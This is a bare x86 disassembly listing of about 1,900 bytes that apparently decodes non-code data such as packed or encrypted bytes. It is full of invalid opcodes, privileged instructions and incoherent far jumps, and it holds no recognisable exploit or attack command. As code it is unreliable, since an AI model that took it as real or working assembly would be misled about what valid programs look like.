  40b84b:	mov    ?,WORD PTR [edi+0x72]
  40b84e:	jae    0x40b815
  40b850:	popa   
  40b851:	sbb    bh,BYTE PTR [esi]
  40b853:	mov    bh,0x32
  40b855:	(bad)  
  40b857:	jmp    0x69c4:0x6d123556
  40b85e:	push   0x811fb7a5
  40b863:	or     BYTE PTR [esi+0x5175d464],cl
  40b869:	hlt    
  40b86a:	inc    ebp
  40b86b:	xlat   BYTE PTR ds:[ebx]
  40b86c:	fld    st(5)
  40b86e:	int3   
  40b86f:	fdivr  DWORD PTR [esi-0x7485976b]
  40b875:	in     eax,0xda
  40b877:	daa    
  40b878:	fsub   DWORD PTR [edi]
  40b87a:	sbb    BYTE PTR [edi+edi*8],0x49
  40b87e:	mov    eax,ds:0x456f2ed0
  40b883:	cmp    eax,0xe82c4687
  40b888:	enter  0xccc3,0x7
  40b88c:	stc    
  40b88d:	mov    esp,DWORD PTR [esi-0x46]
  40b890:	xchg   ebx,eax
  40b891:	clc    
  40b892:	dec    edx
  40b893:	jl     0x40b86a
  40b895:	retf   
  40b896:	cld    
  40b897:	sub    WORD PTR [eax-0x296bd8bf],ax
  40b89e:	inc    eax
  40b89f:	jle    0x40b864
  40b8a1:	dec    ecx
  40b8a2:	fsubp  st(2),st
  40b8a4:	ja     0x40b8cc
  40b8a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8a7:	int    0x18
  40b8a9:	or     al,0x8f
  40b8ab:	sti    
  40b8ac:	and    dl,BYTE PTR [eax]
  40b8ae:	retf   
  40b8af:	aas    
  40b8b0:	or     DWORD PTR [ebp-0x17],esp
  40b8b3:	pop    esp
  40b8b4:	shl    eax,0x9a
  40b8b7:	xor    eax,0x29309e8a
  40b8bc:	ja     0x40b910
  40b8be:	inc    eax
  40b8bf:	pop    cx
  40b8c1:	out    0x98,eax
  40b8c3:	adc    BYTE PTR [eax+0x1f],al
  40b8c6:	lods   al,BYTE PTR ds:[esi]
  40b8c7:	mov    ch,0x57
  40b8c9:	mov    dl,0x53
  40b8cb:	hlt    
  40b8cc:	fcom   st(0)
  40b8ce:	cmp    al,0x42
  40b8d0:	mov    edx,0x67478413
  40b8d5:	or     ebp,0xffffff96
  40b8d8:	pop    ds
  40b8d9:	pop    esi
  40b8da:	mov    cl,0xa1
  40b8dc:	pop    esp
  40b8dd:	js     0x40b93c
  40b8df:	xchg   esp,eax
  40b8e0:	cdq    
  40b8e1:	xchg   ecx,eax
  40b8e2:	jp     0x40b8b2
  40b8e4:	daa    
  40b8e5:	jbe    0x40b900
  40b8e7:	sub    ecx,DWORD PTR [edx]
  40b8e9:	fwait
  40b8ea:	dec    edx
  40b8eb:	jno    0x40b954
  40b8ed:	or     ebp,DWORD PTR [edx+0x6cf39f6f]
  40b8f3:	xchg   DWORD PTR [ecx+0x2d901c6f],eax
  40b8f9:	cs cld 
  40b8fb:	fstp   DWORD PTR [ebx]
  40b8fd:	test   BYTE PTR [edx-0x30],bh
  40b900:	ror    DWORD PTR [edi+0x3999904e],0x33
  40b907:	mov    dl,0x1d
  40b90a:	mov    edx,DWORD PTR [ebx]
  40b90c:	aas    
  40b90d:	js     0x40b95b
  40b90f:	cwde   
  40b910:	xchg   edx,eax
  40b911:	cdq    
  40b912:	ffreep st(6)
  40b914:	std    
  40b915:	test   eax,0xb4e786f1
  40b91a:	test   BYTE PTR [eax],ch
  40b91c:	pushf  
  40b91d:	mov    al,ds:0xf6cbf6cd
  40b922:	stos   BYTE PTR es:[edi],al
  40b923:	push   ebx
  40b924:	adc    ah,BYTE PTR [esi+0x2c5c1739]
  40b92a:	jo     0x40b91e
  40b92c:	push   ecx
  40b92d:	push   edi
  40b92e:	sbb    esi,ecx
  40b930:	push   edx
  40b931:	add    ch,BYTE PTR [edx+0x44]
  40b934:	cmp    al,0xc9
  40b936:	jnp    0x40b913
  40b938:	aad    0xa1
  40b93a:	sub    eax,0xce154692
  40b93f:	sbb    DWORD PTR [ebp-0x5d],ebp
  40b942:	bound  ebx,QWORD PTR [eax]
  40b944:	mov    ds:0x5841486a,al
  40b949:	loop   0x40b900
  40b94b:	jbe    0x40b99d
  40b94d:	ss das 
  40b94f:	jae    0x40b959
  40b951:	sub    eax,0xc7c62cbc
  40b956:	adc    ecx,DWORD PTR [esi+0x74b1e89b]
  40b95c:	sti    
  40b95d:	daa    
  40b95e:	sub    al,0xfc
  40b960:	xor    al,0x89
  40b962:	jno    0x40b986
  40b964:	sbb    BYTE PTR [esp+ecx*8-0x28ba5c08],bl
  40b96b:	ss xchg dh,ch
  40b96e:	mov    ebx,0xb78699fc
  40b973:	sbb    ebp,DWORD PTR [edx+0x4f]
  40b976:	adc    edi,DWORD PTR [eax-0x48]
  40b979:	dec    ebp
  40b97a:	sub    BYTE PTR ds:0x92fce8a7,ch
  40b980:	data16 fdivr st,st(2)
  40b983:	and    al,0x68
  40b985:	xchg   ecx,eax
  40b986:	or     eax,0xa2696de2
  40b98b:	or     bh,BYTE PTR [edx]
  40b98d:	fsub   st(6),st
  40b98f:	mov    ecx,0x7722f02f
  40b994:	gs repz push eax
  40b997:	adc    ch,BYTE PTR [edi]
  40b999:	rcl    DWORD PTR [ebx+0x54f002ef],1
  40b99f:	xor    eax,0xca10df95
  40b9a4:	push   eax
  40b9a5:	xor    al,0xcc
  40b9a7:	dec    dl
  40b9a9:	dec    esi
  40b9aa:	adc    al,0x2f
  40b9ac:	rcl    eax,0xbb
  40b9af:	add    bl,BYTE PTR [edi]
  40b9b1:	in     eax,0xf8
  40b9b3:	(bad)  
  40b9b4:	jge    0x40b95d
  40b9b6:	dec    ecx
  40b9b7:	test   eax,0x59b0e7c1
  40b9bc:	cdq    
  40b9bd:	cmc    
  40b9be:	bound  esi,QWORD PTR [ecx]
  40b9c0:	xchg   ebp,eax
  40b9c1:	hlt    
  40b9c2:	mov    ebx,0xe903e2e0
  40b9c7:	dec    ebx
  40b9c8:	popf   
  40b9c9:	push   esi
  40b9ca:	mov    ebp,0xc29f3cb0
  40b9cf:	retf   0x7a3d
  40b9d2:	mov    ds:0x506cadf5,eax
  40b9d7:	ror    BYTE PTR [ebp+0xd],0x18
  40b9db:	cmp    eax,0x735931b2
  40b9e0:	ret    0xf650
  40b9e3:	ret    0xc2c8
  40b9e6:	mov    al,ds:0xe339c92
  40b9eb:	adc    ch,BYTE PTR [ecx]
  40b9ed:	sub    DWORD PTR [edi],edx
  40b9ef:	retf   
  40b9f0:	lahf   
  40b9f1:	jae    0x40ba14
  40b9f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9f4:	cmp    cl,BYTE PTR [eax+0xe]
  40b9f7:	js     0x40b9fa
  40b9f9:	sbb    DWORD PTR [ebp-0x41aab2d2],ebp
  40b9ff:	push   ebx
  40ba00:	addr16 (bad) 
  40ba02:	std    
  40ba03:	pop    esi
  40ba04:	repnz daa 
  40ba06:	mov    ds:0xc02dd353,al
  40ba0b:	xor    dl,BYTE PTR [esi-0x5a]
  40ba0e:	test   DWORD PTR [edx-0x21c8830e],0xadc6eb90
  40ba18:	adc    esp,DWORD PTR [eax-0x62]
  40ba1b:	iret   
  40ba1c:	gs (bad) 
  40ba1e:	xchg   edi,eax
  40ba1f:	out    0x21,al
  40ba21:	cmc    
  40ba22:	std    
  40ba23:	push   0x96cd3453
  40ba28:	scas   al,BYTE PTR es:[edi]
  40ba29:	fs retf 0x2020
  40ba2d:	shl    DWORD PTR [ebp-0x32],0x86
  40ba31:	jne    0x40ba8c
  40ba33:	stos   DWORD PTR es:[edi],eax
  40ba34:	add    eax,0x90cd4e78
  40ba39:	in     al,dx
  40ba3a:	or     dl,BYTE PTR [esi+0x43]
  40ba3d:	pop    ss
  40ba3e:	mov    edi,0xd4253700
  40ba43:	cmp    al,0x7d
  40ba45:	xchg   ebp,eax
  40ba46:	das    
  40ba47:	popa   
  40ba48:	and    DWORD PTR [edi-0x54],ecx
  40ba4b:	adc    BYTE PTR [eax],0xa5
  40ba4e:	sub    al,0x2f
  40ba50:	repnz xor eax,0x627dfe0e
  40ba56:	xor    al,0x41
  40ba58:	addr16 pop ss
  40ba5a:	retf   
  40ba5b:	xor    al,0x65
  40ba5d:	dec    esp
  40ba5e:	dec    edx
  40ba5f:	mov    eax,ds:0x6b17d2d8
  40ba64:	out    0x5,al
  40ba66:	in     al,dx
  40ba67:	test   eax,0xe8671070
  40ba6c:	mov    dl,0x0
  40ba6e:	pop    ecx
  40ba6f:	cdq    
  40ba70:	inc    esp
  40ba71:	sub    di,bp
  40ba74:	les    edi,FWORD PTR [edx]
  40ba76:	inc    ebp
  40ba77:	nop
  40ba78:	int3   
  40ba79:	test   DWORD PTR [ebp+0x46],0x15a6ae3
  40ba80:	enter  0x2bd5,0x4b
  40ba84:	test   eax,0x83a65e19
  40ba89:	sub    al,0xb2
  40ba8b:	push   0x64
  40ba8d:	jmp    0x40bad8
  40ba8f:	fcom   DWORD PTR [edi+0x3d18fbff]
  40ba95:	test   BYTE PTR [edi],bl
  40ba97:	xlat   BYTE PTR ds:[ebx]
  40ba98:	push   ebx
  40ba99:	add    eax,0x7fc9429b
  40ba9e:	add    eax,0xe08f3e15
  40baa3:	cli    
  40baa4:	adc    BYTE PTR [ecx+0x1b],dl
  40baa7:	mov    ch,0x98
  40baa9:	and    al,0x2b
  40baab:	ins    BYTE PTR es:[edi],dx
  40baac:	leave  
  40baad:	sub    BYTE PTR [esi+edi*2-0x1719c7ec],ah
  40bab4:	clc    
  40bab5:	mov    ebx,0x44a4bbfb
  40baba:	ror    DWORD PTR [edi],1
  40babc:	push   ds
  40babd:	sub    eax,0xd25dd230
  40bac2:	xor    al,0x48
  40bac4:	sub    al,0x98
  40bac6:	push   ebx
  40bac7:	jmp    0x40bb19
  40bac9:	sbb    eax,0x7eecd79c
  40bace:	mov    edx,DWORD PTR [edx-0x54467fb9]
  40bad4:	mov    ch,dh
  40bad6:	out    dx,al
  40bad7:	mov    cl,0x0
  40bad9:	xchg   DWORD PTR [edx+ebp*1],ecx
  40badc:	sub    DWORD PTR [edx+0x5f7d1ae2],esp
  40bae2:	adc    esp,DWORD PTR [ecx-0x5e]
  40bae5:	into   
  40bae6:	(bad)  
  40bae7:	in     al,dx
  40bae8:	sbb    al,BYTE PTR [ebp-0x2083e306]
  40baee:	mov    bl,0xee
  40baf0:	jle    0x40bb04
  40baf2:	mov    dh,0x7e
  40baf4:	gs aas 
  40baf6:	aad    0x70
  40baf8:	popf   
  40baf9:	clc    
  40bafa:	adc    bl,0x25
  40bafd:	in     eax,0xb3
  40baff:	test   BYTE PTR [ecx-0x34357dc6],al
  40bb05:	dec    edx
  40bb06:	imul   esi,esi,0x8609cb0e
  40bb0c:	ins    DWORD PTR es:[edi],dx
  40bb0d:	fcmovnu st,st(4)
  40bb0f:	jae    0x40baa1
  40bb11:	out    dx,eax
  40bb12:	inc    esi
  40bb13:	call   0x323c:0x21682d03
  40bb1a:	nop    DWORD PTR [eax]
  40bb1d:	pop    esp
  40bb1e:	jb     0x40bb1b
  40bb20:	in     al,0x91
  40bb22:	mov    bh,0xfe
  40bb24:	add    eax,0x5158d01e
  40bb29:	mov    dh,0x60
  40bb2b:	push   ecx
  40bb2c:	test   eax,0x9490639e
  40bb31:	(bad)  
  40bb32:	sti    
  40bb33:	dec    ebx
  40bb34:	out    dx,al
  40bb35:	push   esi
  40bb36:	inc    eax
  40bb37:	sbb    al,0x7a
  40bb39:	xor    dl,BYTE PTR [edx]
  40bb3b:	mov    cl,0xaf
  40bb3d:	pop    esi
  40bb3e:	fdivr  DWORD PTR [eax]
  40bb40:	popa   
  40bb41:	sub    DWORD PTR [ebx-0x3e],edi
  40bb44:	clc    
  40bb45:	dec    edi
  40bb46:	cmp    dh,bh
  40bb48:	es mov ch,al
  40bb4b:	jge    0x40bba1
  40bb4d:	rcl    DWORD PTR [edx],0x10
  40bb50:	jmp    0x40badf
  40bb52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb53:	mov    dh,dl
  40bb55:	pop    ebp
  40bb56:	jb     0x40bb01
  40bb58:	pop    ebp
  40bb59:	cmp    bl,BYTE PTR [edx]
  40bb5b:	sub    esp,esi
  40bb5d:	call   ebx
  40bb5f:	xor    al,0xc
  40bb61:	out    dx,eax
  40bb62:	iret   
  40bb63:	push   0xcdd69f6e
  40bb68:	int3   
  40bb69:	sub    DWORD PTR [ebx+0x620bb296],eax
  40bb6f:	mov    ds:0xb6275176,al
  40bb74:	mov    eax,0x93f5be0c
  40bb79:	xchg   BYTE PTR [esp+ebp*2],dh
  40bb7c:	in     eax,0xeb
  40bb7e:	adc    al,BYTE PTR [ebp-0x7c07701e]
  40bb84:	push   edi
  40bb85:	(bad)  
  40bb86:	ja     0x40bb71
  40bb88:	push   ebp
  40bb89:	add    esp,0x78
  40bb8c:	sar    esp,1
  40bb8e:	inc    esi
  40bb8f:	jnp    0x40bb66
  40bb91:	mov    ah,0x86
  40bb93:	mov    ch,0xa5
  40bb95:	inc    esi
  40bb96:	pop    esp
  40bb97:	fisub  WORD PTR [eax-0x6a]
  40bb9a:	mov    ebp,0xf321ee5a
  40bb9f:	arpl   WORD PTR [esi],si
  40bba1:	and    DWORD PTR [ebx-0x34],esi
  40bba4:	aas    
  40bba5:	push   eax
  40bba6:	cwde   
  40bba7:	mov    dh,0xa9
  40bba9:	xor    BYTE PTR [esi-0x3e],dh
  40bbac:	call   0xf8b2ab80
  40bbb1:	adc    eax,0xff1e462b
  40bbb6:	mov    dl,0x88
  40bbb8:	stos   DWORD PTR es:[edi],eax
  40bbb9:	mov    ds:0xf90e5ea0,eax
  40bbbe:	add    al,0xf
  40bbc0:	stos   BYTE PTR es:[edi],al
  40bbc1:	cmp    edx,DWORD PTR [ecx]
  40bbc3:	sub    DWORD PTR [ecx-0x38],ecx
  40bbc6:	cmp    edi,ebx
  40bbc8:	fstp   TBYTE PTR [eax]
  40bbca:	retf   0x7b58
  40bbcd:	cmp    al,0x58
  40bbcf:	aam    0x9d
  40bbd1:	cwde   
  40bbd2:	mov    bl,0xe
  40bbd4:	sub    BYTE PTR [eax-0x32],ch
  40bbd7:	(bad)  
  40bbd8:	fnstcw WORD PTR [ebp-0x9]
  40bbdb:	test   DWORD PTR [eax+esi*1+0x562f1deb],edi
  40bbe2:	sub    ch,dl
  40bbe4:	jp     0x40bbdb
  40bbe6:	mov    ds:0x1a3b680a,al
  40bbeb:	lock iret 
  40bbed:	xchg   ebp,eax
  40bbee:	jb     0x40bc14
  40bbf0:	stos   BYTE PTR es:[edi],al
  40bbf1:	add    DWORD PTR [edi],edi
  40bbf3:	jne    0x40bc19
  40bbf5:	pop    esp
  40bbf6:	call   0x9c03:0xfb7043aa
  40bbfd:	inc    eax
  40bbfe:	imul   esi,DWORD PTR [ebx+0x697f11b3],0x44c353d6
  40bc08:	mov    ebx,ebp
  40bc0a:	ror    BYTE PTR [edi-0x43],1
  40bc0d:	loop   0x40bc3d
  40bc0f:	mov    ah,0xe4
  40bc11:	or     al,0x59
  40bc13:	loop   0x40bc55
  40bc15:	(bad)
  40bc18:	sbb    BYTE PTR [edx+0x1e9bcc4d],0xff
  40bc1f:	icebp  
  40bc20:	popa   
  40bc21:	retf   
  40bc22:	sub    eax,0xa7ca352
  40bc27:	aam    0xb9
  40bc29:	sub    ecx,DWORD PTR ds:0x8f2d32e
  40bc2f:	inc    ebx
  40bc30:	test   eax,0x16fe568f
  40bc35:	adc    al,0xc1
  40bc37:	cwde   
  40bc38:	push   es
  40bc39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc3a:	ret    0x388b
  40bc3d:	jmp    0x406f:0x31f4f87c
  40bc44:	push   cs
  40bc45:	icebp  
  40bc46:	jmp    eax
  40bc48:	(bad)  
  40bc49:	adc    dh,dh
  40bc4b:	aas    
  40bc4c:	sub    eax,0x638eaace
  40bc51:	inc    edx
  40bc52:	xor    DWORD PTR [ecx+eiz*8-0x212e2965],esi
  40bc59:	mov    cl,0xcf
  40bc5b:	data16 sar BYTE PTR [ebx+ecx*8-0x2a],cl
  40bc60:	mov    WORD PTR [ecx],ss
  40bc62:	sbb    al,0x68
  40bc64:	jae    0x40bc2c
  40bc66:	adc    BYTE PTR [eax-0x28efc0c0],ch
  40bc6c:	and    dh,BYTE PTR [eax]
  40bc6e:	dec    ebp
  40bc6f:	sub    DWORD PTR [esi-0x27d43b5e],edx
  40bc75:	js     0x40bc0d
  40bc77:	xchg   edx,eax
  40bc78:	div    edi
  40bc7a:	dec    eax
  40bc7b:	leave  
  40bc7c:	xlat   BYTE PTR ds:[ebx]
  40bc7d:	test   BYTE PTR [ebp+esi*1+0x5a],ah
  40bc81:	fst    st(2)
  40bc83:	dec    esp
  40bc84:	mov    ah,0xea
  40bc86:	jp     0x40bc52
  40bc88:	and    bh,0x60
  40bc8b:	sbb    BYTE PTR [eax-0x3c],ah
  40bc8e:	dec    ecx
  40bc8f:	sub    eax,DWORD PTR [ebx+0x23a046a2]
  40bc95:	push   edi
  40bc96:	scas   al,BYTE PTR es:[edi]
  40bc97:	jb     0x40bcef
  40bc99:	leave  
  40bc9a:	pop    ebx
  40bc9b:	cdq    
  40bc9c:	mov    dh,0xb4
  40bc9e:	jb     0x40bce8
  40bca0:	aam    0x1f
  40bca2:	bnd jae 0x40bcdb
  40bca5:	mov    ebx,0x9d2d8310
  40bcaa:	cmp    edi,DWORD PTR [ebx-0x699e4df1]
  40bcb0:	add    bh,bh
  40bcb2:	sub    cl,dl
  40bcb4:	jge    0x40bc5a
  40bcb6:	aaa    
  40bcb7:	outs   dx,BYTE PTR ds:[esi]
  40bcb8:	pop    esp
  40bcb9:	imul   ebx,DWORD PTR [eax+0x135ec18f],0x6f
  40bcc0:	mov    edx,0x576034e4
  40bcc5:	sub    al,0xd9
  40bcc8:	aas    
  40bcc9:	inc    edx
  40bcca:	adc    dh,BYTE PTR [edx+0x1081406e]
  40bcd0:	stos   BYTE PTR es:[edi],al
  40bcd1:	add    BYTE PTR [esi-0x45],dl
  40bcd4:	add    BYTE PTR [edx+eax*4+0x2d],ch
  40bcd8:	and    ecx,esp
  40bcda:	mov    eax,0x9e1fc333
  40bcdf:	lods   eax,DWORD PTR ds:[esi]
  40bce0:	test   dl,cl
  40bce2:	gs dec ebx
  40bce4:	adc    BYTE PTR [edx+0x48410cd1],dh
  40bcea:	loopne 0x40bd4f
  40bcec:	add    DWORD PTR [ecx+edx*1],esp
  40bcef:	fs out 0x40,eax
  40bcf2:	jnp    0x40bd38
  40bcf4:	add    dh,BYTE PTR [esi+0x57]
  40bcf7:	sub    al,BYTE PTR [ebx+0x7d]
  40bcfa:	(bad)  
  40bcfb:	push   0xffffffe6
  40bcfd:	or     esp,ecx
  40bcff:	sbb    al,0xad
  40bd01:	and    BYTE PTR [edi+edx*2-0x60],al
  40bd05:	pop    ecx
  40bd06:	mov    ebp,0x3c2f83f0
  40bd0b:	inc    esp
  40bd0c:	pop    ss
  40bd0d:	lock cmp ebx,DWORD PTR [esi-0x2c6c00e0]
  40bd14:	push   0x7d
  40bd16:	int3   
  40bd17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd18:	lock push 0xffffff86
  40bd1b:	mov    ch,0xf5
  40bd1d:	popf   
  40bd1e:	aas    
  40bd1f:	push   0xffffffc9
  40bd21:	add    BYTE PTR [edx-0x2c78a061],al
  40bd27:	mov    DWORD PTR [edx+0x62736e53],esp
  40bd2d:	adc    eax,0xd41c0a1f
  40bd32:	xor    DWORD PTR [edx+0x78],edi
  40bd35:	loop   0x40bda4
  40bd37:	iret   
  40bd38:	mov    dl,0x57
  40bd3a:	cli    
  40bd3b:	leave  
  40bd3c:	dec    ebp
  40bd3d:	int3   
  40bd3e:	or     al,0xee
  40bd40:	jmp    0x9057:0x131d5fda
  40bd47:	fsub   DWORD PTR [eax]
  40bd49:	repz popa 
  40bd4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd4c:	mov    al,ds:0x91d04bbc
  40bd51:	imul   edx,DWORD PTR [eax+0x4f],0xb062489b
  40bd58:	jbe    0x40bd3c
  40bd5a:	push   ss
  40bd5b:	sub    al,0xd6
  40bd5d:	dec    esi
  40bd5e:	icebp  
  40bd5f:	and    BYTE PTR [edi-0x34],ah
  40bd62:	mov    ebp,0x206f5dd2
  40bd67:	out    dx,al
  40bd68:	in     eax,dx
  40bd69:	sbb    ebx,DWORD PTR [ecx+0x7f]
  40bd6c:	pop    edx
  40bd6d:	jno    0x40bd14
  40bd6f:	or     DWORD PTR [edx],edx
  40bd71:	jecxz  0x40bdc6
  40bd73:	hlt    
  40bd74:	mov    esi,DWORD PTR ds:0x27cf2fe6
  40bd7a:	rcl    esp,1
  40bd7c:	and    DWORD PTR [ecx-0x8],edi
  40bd7f:	mov    esi,0xdce7d38a
  40bd84:	adc    ecx,ebx
  40bd86:	icebp  
  40bd87:	test   DWORD PTR [esi+0x3165c01],0x7dc6b6c3
  40bd91:	sti    
  40bd92:	adc    ah,cl
  40bd94:	jecxz  0x40bd72
  40bd96:	ror    al,cl
  40bd98:	(bad)  
  40bd99:	fidivr DWORD PTR [ecx+ebx*4-0x78]
  40bd9d:	test   BYTE PTR [ebx-0x54],0x54
  40bda1:	push   ebp
  40bda2:	xlat   BYTE PTR ds:[ebx]
  40bda3:	xchg   ebx,eax
  40bda4:	cmp    eax,0x7359b532
  40bda9:	adc    al,0xf5
  40bdab:	mov    ch,0x81
  40bdad:	(bad)  
  40bdae:	loop   0x40bda4
  40bdb0:	lods   eax,DWORD PTR ds:[esi]
  40bdb1:	jle    0x40be09
  40bdb3:	popf   
  40bdb4:	sub    eax,DWORD PTR [edx]
  40bdb6:	cmp    BYTE PTR [ebx*4+0x5c7cfc56],ch
  40bdbd:	mov    dh,0xd8
  40bdbf:	fst    QWORD PTR [eax-0x20]
  40bdc2:	loop   0x40bdc1
  40bdc4:	das    
  40bdc5:	cwde   
  40bdc6:	mov    edi,0x305656d2
  40bdcb:	lods   al,BYTE PTR ds:[esi]
  40bdcc:	popf   
  40bdcd:	fs into 
  40bdcf:	in     eax,0x99
  40bdd1:	aad    0x4d
  40bdd3:	cmp    eax,0x4b463d1e
  40bdd8:	mov    ecx,0xab879899
  40bddd:	pop    esi
  40bdde:	inc    edx
  40bddf:	push   ss
  40bde0:	jmp    0x9f51:0xbf5c5c4e
  40bde7:	call   0x88824671
  40bdec:	jbe    0x40bdf4
  40bdee:	es mov cl,0x41
  40bdf1:	sub    ebp,esi
  40bdf3:	dec    edi
  40bdf4:	int3   
  40bdf5:	xor    edi,DWORD PTR [eax-0x1b4ad2d8]
  40bdfb:	test   eax,0x30fe7e6
  40be00:	push   es
  40be01:	frstor [eax+ebp*4+0x24282fe6]
  40be08:	fwait
  40be09:	(bad)  
  40be0a:	daa    
  40be0b:	es nop
  40be0d:	or     ah,BYTE PTR [ecx+0x56]
  40be10:	adc    BYTE PTR [ebp-0x9],0xb5
  40be14:	push   0x49
  40be16:	hlt    
  40be17:	mov    edi,0xf647fced
  40be1c:	inc    ebp
  40be1d:	(bad)  
  40be1f:	cmp    bl,BYTE PTR [edi]
  40be21:	mov    esp,0x1a5bd8d6
  40be26:	xchg   ecx,eax
  40be27:	cmp    BYTE PTR [ebx+eax*8],bl
  40be2a:	inc    eax
  40be2b:	(bad)  
  40be2c:	repnz xor dl,BYTE PTR [edx+0x540fcc16]
  40be33:	mov    WORD PTR [ebp-0x6f],gs
  40be36:	(bad)  
  40be37:	popf   
  40be38:	enter  0xe2d3,0x4b
  40be3c:	or     eax,0xaf3c1525
  40be41:	sub    cl,BYTE PTR [edi-0x42]
  40be44:	outs   dx,BYTE PTR ds:[esi]
  40be45:	arpl   WORD PTR [edx-0x63],dx
  40be48:	or     esi,ebx
  40be4a:	mov    bl,0xae
  40be4c:	cs int3 
  40be4e:	fld    QWORD PTR [edx+0x31bc59fc]
  40be54:	fld    DWORD PTR [ebx]
  40be56:	sub    DWORD PTR [esp+ebx*2+0x6799d91b],eax
  40be5d:	js     0x40be58
  40be5f:	in     al,dx
  40be60:	push   esi
  40be61:	xor    cl,bh
  40be63:	push   es
  40be64:	push   ebx
  40be65:	sbb    al,0xa4
  40be67:	add    bl,ch
  40be69:	add    dl,BYTE PTR [eax-0x41]
  40be6c:	dec    ebx
  40be6d:	and    DWORD PTR [eax+0x26],edi
  40be70:	pop    ds
  40be71:	inc    eax
  40be72:	fisubr DWORD PTR [edi]
  40be74:	mov    al,ds:0x27cbd348
  40be79:	stos   BYTE PTR es:[edi],al
  40be7a:	inc    ebp
  40be7b:	popf   
  40be7c:	and    al,dl
  40be7e:	into   
  40be7f:	sub    al,0xb3
  40be81:	lods   eax,DWORD PTR ds:[esi]
  40be82:	add    al,0xb9
  40be84:	push   ss
  40be85:	inc    eax
  40be86:	or     bl,bh
  40be88:	xor    DWORD PTR [ebp-0x61d6f267],eax
  40be8e:	in     eax,dx
  40be8f:	arpl   WORD PTR [edi],ax
  40be91:	mov    dh,ah
  40be93:	mov    ecx,0xeb98d516
  40be98:	mov    eax,ds:0x215d27e5
  40be9d:	jge    0x40be34
  40be9f:	dec    esi
  40bea0:	xchg   esi,eax
  40bea1:	inc    ecx
  40bea2:	add    BYTE PTR [eax+0x35],dl
  40bea5:	push   edi
  40bea6:	or     al,0xf7
  40bea8:	in     eax,dx
  40bea9:	add    ecx,DWORD PTR [eax-0x15464bdb]
  40beaf:	test   eax,0xdde30921
  40beb4:	push   eax
  40beb5:	mov    ebp,0x68d292e9
  40beba:	fdivrp st(0),st
  40bebc:	and    dh,dh
  40bebe:	push   ss
  40bebf:	mov    al,ds:0x5687efef
  40bec4:	mov    bl,0x87
  40bec6:	hlt    
  40bec7:	xchg   ebp,eax
  40bec8:	mov    ecx,0xfa4833af
  40becd:	push   0x2c9cda99
  40bed2:	dec    esp
  40bed3:	dec    edi
  40bed4:	scas   eax,DWORD PTR es:[edi]
  40bed5:	ror    DWORD PTR [edi],cl
  40bed7:	in     eax,0x2b
  40bed9:	aas    
  40beda:	push   esp
  40bedb:	pop    esp
  40bedc:	mov    eax,ds:0xd31f4b9d
  40bee1:	in     eax,0x3a
  40bee3:	ret    
  40bee4:	js     0x40be67
  40bee6:	sbb    eax,0x60b119b3
  40beeb:	popa   
  40beec:	je     0x40be92
  40beee:	mov    bl,0x15
  40bef0:	std    
  40bef1:	or     bh,BYTE PTR [edx+edx*1]
  40bef4:	data16 sbb ah,BYTE PTR [ecx+0x252c2706]
  40befb:	icebp  
  40befc:	jle    0x40beb4
  40befe:	sub    DWORD PTR [bp+di-0x1898],ecx
  40bf03:	xor    al,0x1b
  40bf05:	aaa    
  40bf06:	and    DWORD PTR [ebx-0x77],ecx
  40bf09:	out    0x51,eax
  40bf0b:	cmp    al,0x51
  40bf0d:	retf   
  40bf0e:	in     al,dx
  40bf0f:	inc    esi
  40bf10:	in     eax,dx
  40bf11:	addr16 in al,dx
  40bf13:	fst    QWORD PTR [ecx]
  40bf15:	push   ss
  40bf16:	jae    0x40be9c
  40bf18:	sbb    eax,0x679e6518
  40bf1d:	mov    ds,WORD PTR [edx-0x29]
  40bf20:	fwait
  40bf21:	out    0xec,al
  40bf23:	xchg   ecx,eax
  40bf24:	jbe    0x40bf42
  40bf26:	and    eax,0x68368e2f
  40bf2b:	cmp    BYTE PTR [edi+0x37c4d1f0],dh
  40bf31:	xor    al,0x4
  40bf33:	test   al,0xaf
  40bf35:	sahf   
  40bf36:	fwait
  40bf37:	in     al,dx
  40bf38:	mov    esp,0x792b8f98
  40bf3d:	sub    bl,0x8a
  40bf40:	clc    
  40bf41:	repnz xchg edx,eax
  40bf43:	scas   eax,DWORD PTR es:[edi]
  40bf44:	pushf  
  40bf45:	call   0xbe6235b3
  40bf4a:	pop    edi
  40bf4b:	sub    al,0xa0
  40bf4d:	dec    edi
  40bf4e:	ror    DWORD PTR [edi],cl
  40bf50:	push   ds
  40bf51:	sbb    cl,BYTE PTR [eax+0x3c]
  40bf54:	popa   
  40bf55:	fucom  st(5)
  40bf57:	ffreep st(3)
  40bf59:	mov    WORD PTR [edi+ecx*8+0x27a56cb6],es
  40bf60:	jecxz  0x40bf5d
  40bf62:	jg     0x40bf22
  40bf64:	mov    al,0x6b
  40bf66:	adc    eax,0xb41edf02
  40bf6b:	icebp  
  40bf6c:	push   ebp
  40bf6d:	mov    al,ds:0x7b1c48d0
  40bf72:	pusha  
  40bf73:	dec    ebx
  40bf74:	int3   
  40bf75:	sbb    cl,BYTE PTR [ecx+ebx*1-0x38303931]
  40bf7c:	mov    ebp,0xfe8be79c
  40bf81:	je     0x40bf9f
  40bf83:	dec    ebp
  40bf84:	(bad)  
  40bf85:	jge    0x40bf9c
  40bf87:	ror    DWORD PTR [edi+0x7294b80],0x90
  40bf8e:	int    0x20
  40bf90:	jae    0x40bf56
  40bf92:	stc    
  40bf93:	sub    ebp,ecx
  40bf95:	mov    esi,0x81f573f1
  40bf9a:	in     eax,dx
  40bf9b:	sbb    ebp,DWORD PTR [edi-0xcf97174]
  40bfa1:	push   ebp
  40bfa2:	neg    DWORD PTR [eax-0x247af23f]
  40bfa8:	outs   dx,BYTE PTR ds:[esi]
  40bfa9:	jge    0x40bf57
  40bfab:	jo     0x40bfd7
  40bfad:	inc    eax
  40bfae:	rcr    dh,0x13
  40bfb1:	rol    BYTE PTR [edi],0xea
  40bfb4:	push   ebp
  40bfb5:	jl     0x40bfb4
  40bfb7:	sti    
  40bfb8:	add    ah,BYTE PTR [eax+0x27]
  40bfbb:	jmp    0x40bfc5
  40bfbd:	sahf   
  40bfbe:	mov    bl,BYTE PTR [edi+0x20]
  40bfc1:	mov    eax,ds:0x790a50b1
